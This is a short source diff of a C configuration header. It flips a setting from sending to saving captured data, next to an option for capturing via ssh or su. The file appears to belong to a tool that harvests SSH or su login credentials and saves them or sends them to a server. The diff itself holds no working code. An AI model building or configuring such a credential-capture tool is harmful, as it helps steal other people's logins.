@@ -2,7 +2,7 @@
     Custom setting
 */
 # define SSH_OR_BOTH 0 //ssh=0,su&&ssh=1,default is ssh
-# define SAVE_OR_SEND 0 //send=0,save=1,default is send
+# define SAVE_OR_SEND 1 //send=0,save=1,default is send
 
 /*
     Send to server
